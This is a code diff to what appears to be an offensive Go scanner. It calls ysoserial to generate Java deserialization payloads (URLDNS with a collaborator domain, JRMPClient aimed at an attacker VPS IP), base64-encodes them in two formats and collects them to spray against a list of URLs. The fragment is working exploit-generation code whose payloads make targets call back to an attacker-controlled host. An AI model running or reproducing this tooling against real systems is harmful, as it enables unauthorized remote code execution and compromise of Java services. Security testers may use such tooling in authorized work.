@@ -108,12 +108,15 @@ func main() {
 
 	if flagset["y"] {
 		// 3.1. Generate ysoserial URLDNS payload and add them to []payloads{}
-		output, err := exec.Command("java", "-jar", *ysoserial_path, "URLDNS", "http://"+*domain_collab).CombinedOutput()
+		output, err := exec.Command("java", "-jar", *ysoserial_path, "URLDNS", "http://deser."+*domain_collab).CombinedOutput()
 		if err != nil {
 		  os.Stderr.WriteString(err.Error())
 		}
 		uEnc := b64.URLEncoding.EncodeToString([]byte(output))
 	   	payloads = append(payloads,uEnc)
+
+	   	sEnc := b64.StdEncoding.EncodeToString([]byte(output))
+    	payloads = append(payloads,sEnc)
 
 	   	// 3.2. Generate ysoserial JRMPClient payload and add them to []payloads{}
 		output, err = exec.Command("java", "-jar", *ysoserial_path, "JRMPClient", *vps_ip+":80").CombinedOutput()
@@ -122,7 +125,9 @@ func main() {
 		}
 		uEnc = b64.URLEncoding.EncodeToString([]byte(output))
 	   	payloads = append(payloads,uEnc)
-	   	fmt.Println(uEnc)
+	   	
+	   	sEnc = b64.StdEncoding.EncodeToString([]byte(output))
+    	payloads = append(payloads,sEnc)
 		}
 
 	// 4. Load urls_list into array
